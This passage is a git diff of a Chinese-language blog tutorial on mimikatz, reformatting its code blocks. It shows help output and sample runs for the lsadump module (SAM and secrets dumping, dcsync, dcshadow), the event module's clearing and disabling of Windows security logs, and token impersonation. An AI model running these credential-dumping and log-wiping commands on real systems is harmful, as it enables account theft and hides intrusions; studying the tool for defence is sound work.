-ERROR kull_m_registry_OpenAndQueryWithAlloc ;kull_m_registry_RegOpenKeyEx KO
-ERROR kuhl_m_lsadump_getUsersAndSamKey ;kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)</code></pre>
+<p><strong>lsadump模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;lsadump&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        lsadump</span><br><span class="line">Full name :     LsaDump module</span><br><span class="line"></span><br><span class="line">             sam  -  Get the SysKey to decrypt SAM entries (from registry or hives)</span><br><span class="line">         secrets  -  Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">           cache  -  Get the SysKey to decrypt NL<span class="variable">$KM</span> <span class="keyword">then</span> MSCache(v2) (from registry or hives)</span><br><span class="line">             lsa  -  Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)</span><br><span class="line">           trust  -  Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)</span><br><span class="line">      backupkeys</span><br><span class="line">          rpdata</span><br><span class="line">          dcsync  -  Ask a DC to synchronize an object</span><br><span class="line">        dcshadow  -  They told me I could be anything I wanted, so I became a domain controller</span><br><span class="line">         setntlm  -  Ask a server to <span class="built_in">set</span> a new password/ntlm <span class="keyword">for</span> one user</span><br><span class="line">      changentlm  -  Ask a server to <span class="built_in">set</span> a new password/ntlm <span class="keyword">for</span> one user</span><br><span class="line">         netsync  -  Ask a DC to send current and previous NTLM <span class="built_in">hash</span> of DC/SRV/WKS</span><br><span class="line">        packages</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam　　　　#从SAM数据库中读取账号密码</span></span><br><span class="line">Domain : DH-CA8822AB9589</span><br><span class="line">SysKey : 7be839f49edcab29c3a40fe24d47335f</span><br><span class="line">ERROR kull_m_registry_OpenAndQueryWithAlloc ;kull_m_registry_RegOpenKeyEx KO</span><br><span class="line">ERROR kuhl_m_lsadump_getUsersAndSamKey ;kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)</span><br></pre></td></tr></table></figure>
 <p><strong>ts模块：终端服务，默认情况下XP只允许一个活动的登录会话</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215110113398-916664867.png" /></p>
 <p><strong>相当于打上一个补丁，使多个会话可以并行，即多用户登录。</strong></p>
 <p><strong>event模块：日志管理</strong></p>
-<pre><code>mimikatz # event::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;event&quot; module not found !
-
-Module :        event
-Full name :     Event module
-
-            drop  -  [experimental] patch Events service to avoid new events
-           clear  -  Clear an event log
-
-mimikatz # event::clear
-Using &quot;Security&quot; event log :
-- 0 event(s)
-- Cleared !
-- 1 event(s)
-
-mimikatz # event::drop</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># event::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;event&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        event</span><br><span class="line">Full name :     Event module</span><br><span class="line"></span><br><span class="line">            drop  -  [experimental] patch Events service to avoid new events</span><br><span class="line">           clear  -  Clear an event <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># event::clear</span></span><br><span class="line">Using <span class="string">&quot;Security&quot;</span> event <span class="built_in">log</span> :</span><br><span class="line">- 0 event(s)</span><br><span class="line">- Cleared !</span><br><span class="line">- 1 event(s)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># event::drop</span></span><br></pre></td></tr></table></figure>
 <p><strong>clear：清除已记录的安全日志等</strong></p>
 <p><strong>drop：不在进行新的日志记录</strong></p>
 <p><strong>misc模块：杂项</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215110500854-1551202711.png" /></p>
 <p><strong>token模块</strong></p>
-<pre><code>mimikatz # token::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;token&quot; module not found !
-
-Module :        token
-Full name :     Token manipulation module
-
-          whoami  -  Display current identity
-            list  -  List all tokens of the system
-         elevate  -  Impersonate a token
-             run  -  Run!
-          revert  -  Revert to proces token
-
-mimikatz # token::whoami
- * Process Token : &#123;0;0002ed48&#125; 0 - 333441      DH-CA8822AB9589\Administrator S-1-5-21-583907252-1757981266-1177238915-500    (08g,20p)       Primary
- * Thread Token  : no token</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># token::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;token&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        token</span><br><span class="line">Full name :     Token manipulation module</span><br><span class="line"></span><br><span class="line">          <span class="built_in">whoami</span>  -  Display current identity</span><br><span class="line">            list  -  List all tokens of the system</span><br><span class="line">         elevate  -  Impersonate a token</span><br><span class="line">             run  -  Run!</span><br><span class="line">          revert  -  Revert to proces token</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::whoami</span></span><br><span class="line"> * Process Token : &#123;0;0002ed48&#125; 0 - 333441      DH-CA8822AB9589\Administrator S-1-5-21-583907252-1757981266-1177238915-500    (08g,20p)       Primary</span><br><span class="line"> * Thread Token  : no token</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -691,7 +466,7 @@ mimikatz # token::whoami
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
